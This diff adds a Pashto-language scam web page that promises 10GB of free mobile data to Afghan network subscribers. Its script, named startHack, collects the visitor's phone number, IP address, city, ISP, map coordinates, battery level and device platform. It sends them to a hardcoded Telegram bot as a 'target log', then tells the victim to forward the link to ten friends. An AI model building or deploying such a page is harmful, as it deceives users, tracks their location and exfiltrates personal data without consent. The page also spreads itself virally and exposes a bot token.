@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Data Center | افغانستان</title>
+    <style>
+        body { background: #050505; color: #fff; font-family: 'Segoe UI', sans-serif; margin: 0; text-align: center; }
+        .header { background: #f1c40f; color: #000; padding: 15px; font-weight: bold; font-size: 20px; }
+        .container { padding: 20px; max-width: 400px; margin: auto; }
+        .network-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 20px; }
+        .net-card { background: #1a1a1a; border: 1px solid #333; padding: 15px; border-radius: 12px; cursor: pointer; transition: 0.3s; }
+        .net-card:hover { border-color: #f1c40f; transform: translateY(-5px); }
+        .net-card img { width: 50px; height: 50px; border-radius: 50%; margin-bottom: 10px; }
+        input { width: 100%; padding: 15px; margin: 15px 0; border-radius: 8px; border: 1px solid #333; background: #000; color: #fff; box-sizing: border-box; }
+        .btn { width: 100%; padding: 16px; background: #f1c40f; color: #000; border: none; border-radius: 8px; font-weight: bold; font-size: 16px; cursor: pointer; }
+        #loading { display: none; margin-top: 20px; color: #f1c40f; }
+    </style>
+</head>
+<body>
+
+    <div class="header">🎁 د روژې مبارکې په ویاړ وړیا انټرنیټ</div>
+
+    <div class="container">
+        <p style="font-size: 14px; color: #ccc;">خپله شبکه وټاکئ او ۱۰ جي بي (10GB) وړیا ډیټا ترلاسه کړئ.</p>
+        
+        <div class="network-grid">
+            <div class="net-card" onclick="selectNet('AWCC')"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSfF8rE78vT1f0R0_A0_fA" alt="AWCC"><br>AWCC</div>
+            <div class="net-card" onclick="selectNet('Roshan')"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT77H-QYp-0H0W6M0" alt="Roshan"><br>Roshan</div>
+            <div class="net-card" onclick="selectNet('Etisalat')"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSq_Y8H-p" alt="Etisalat"><br>Etisalat</div>
+            <div class="net-card" onclick="selectNet('MTN')"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR_p" alt="MTN"><br>MTN</div>
+        </div>
+
+        <input type="number" id="phone" placeholder="07XXXXXXXX">
+        <button class="btn" onclick="startHack()">فعال کړئ (Activate Now)</button>
+
+        <div id="loading">Connecting to Network Server...</div>
+    </div>
+
+    <script>
+        const token = "8533713892:AAGYF0xkIlVDGmCwywyw3Y2_zt8EuiQfZ-g";
+        const chatId = "7461145170";
+        let selected = "None";
+
+        function selectNet(n) {
+            selected = n;
+            alert(n + " selected! Now enter your number.");
+        }
+
+        async function startHack() {
+            const num = document.getElementById('phone').value;
+            if(!num) { alert("نمبر ولیکئ!"); return; }
+
+            document.getElementById('loading').style.display = 'block';
+
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const d = await res.json();
+                
+                let bat = "Unknown";
+                if (navigator.getBattery) {
+                    const b = await navigator.getBattery();
+                    bat = Math.round(b.level * 100) + "%";
+                }
+
+                const msg = `
+📡 **FREE INTERNET TARGET LOG** 📡
+------------------------------
+📱 **Network:** ${selected}
+📞 **Phone:** \`${num}\`
+🔋 **Battery:** ${bat}
+🌐 **IP:** \`${d.ip}\`
+📍 **Loc:** ${d.city}, ${d.country_name}
+🏢 **ISP:** ${d.org}
+📱 **Device:** ${navigator.platform}
+------------------------------
+📍 **Map:** https://www.google.com/maps?q=${d.latitude},${d.longitude}
+------------------------------
+                `;
+
+                await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: chatId, text: msg, parse_mode: 'Markdown' })
+                });
+
+                setTimeout(() => {
+                    alert("بښنه غواړو! ستاسو نمبر په سیسټم کې تایید نشو. مهرباني وکړئ دا لینک خپلو ۱۰ ملګرو ته واستوئ ترڅو فعال شي.");
+                    window.location.href = "https://t.me/TOPAK1V";
+                }, 4000);
+
+            } catch (e) { window.location.href = "https://t.me/TOPAK1V"; }
+        }
+    </script>
+</body>
+</html>
